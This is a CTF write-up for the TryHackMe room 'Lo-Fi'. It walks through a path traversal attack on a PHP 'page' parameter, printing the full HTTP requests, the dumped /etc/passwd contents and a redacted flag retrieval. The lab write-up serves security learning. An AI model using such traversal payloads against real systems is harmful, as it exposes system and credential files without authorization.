---
title: "Lo-Fi"
date: 2025-01-20
image: /assets/img/tryhackme/Lofi/Lofi_image.jpg
description: Writeup of the TryHackMe-CTF Lo-Fi
categories: [Tryhackme, Easy]
tags: [linux, web, file-inclusion]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Lo-Fi</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Want to hear some lo-fi beats, to relax or study to? We've got you covered!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/lofi">https://tryhackme.com/r/room/lofi</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution to the CTF challenge Lo-Fi.  

## Challenge
The description gives us two hints what we need to do. 
1. Navigate to the following url http://MACHINE_IP and find the flag in the root of the filesystem.
2. Check out similar content on TryHackMe: <a href="https://tryhackme.com/r/room/filepathtraversal">LFI Path Traversal</a>

This seems to be a Path Traversal vulnerability in the Website. Start up Burpsuite and open the website in the browser.
From here we need to find parameters which we could manipulate.
After simply interacting with the website we can see the usage of the parameter `page` which loads `php` files:

![command execution page](/assets/img/tryhackme/Lofi/thm_lofi_1.jpg){: width="1200" height="195" .w-75 .normal}

Let's try inject the simple payload `../../../../../../../../../../../etc/passwd` in the request:
```http
GET /?page=../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 10.10.39.143
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
The result confirm the payload is working:
```html
      <!-- Blog Post -->
        <div class="card mb-4">
          <div class="card-body">
            root:x:0:0:root:/root:/bin/bash
            daemon:x:1:1:daemon:/usr/sbin:/bin/sh
            bin:x:2:2:bin:/bin:/bin/sh
            sys:x:3:3:sys:/dev:/bin/sh
            sync:x:4:65534:sync:/bin:/bin/sync
            games:x:5:60:games:/usr/games:/bin/sh
            man:x:6:12:man:/var/cache/man:/bin/sh
            lp:x:7:7:lp:/var/spool/lpd:/bin/sh
            mail:x:8:8:mail:/var/mail:/bin/sh
            news:x:9:9:news:/var/spool/news:/bin/sh
            uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
            proxy:x:13:13:proxy:/bin:/bin/sh
            www-data:x:33:33:www-data:/var/www:/bin/sh
            backup:x:34:34:backup:/var/backups:/bin/sh
            list:x:38:38:Mailing List Manager:/var/list:/bin/sh
            irc:x:39:39:ircd:/var/run/ircd:/bin/sh
            gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
            nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
            libuuid:x:100:101::/var/lib/libuuid:/bin/sh
          </div>
        </div>
```
From here we can try to search the flag:
```http
GET /?page=../../../../../../../../../../../flag.txt HTTP/1.1
Host: 10.10.39.143
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
found the flag:
```html
      <!-- Blog Post -->
        <div class="card mb-4">
          <div class="card-body">
            flag{*********** removed ***********}
          </div>
        </div>
```
solved! :)
